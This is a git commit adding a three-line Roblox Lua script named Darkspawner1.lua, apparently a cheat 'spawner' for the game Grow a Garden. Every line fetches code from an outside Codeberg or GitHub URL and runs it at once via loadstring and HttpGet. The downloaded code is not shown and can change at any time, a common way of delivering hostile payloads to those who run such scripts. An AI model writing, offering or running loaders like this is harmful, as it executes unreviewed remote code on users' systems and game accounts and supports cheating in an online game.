e93818fc3ee7aefd26bb14b79e218ab4b2ce205e
mohammedf16X <fivehjoftoj366@gmail.com>
2025-07-17 04:49:22 +0300

    Create Darkspawner1.lua

---
+++ Darkspawner1.lua
@@ -0,0 +1,3 @@
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mohammedf16X/DARKSPAWNER/refs/heads/main/Darkspawner.lua"))()
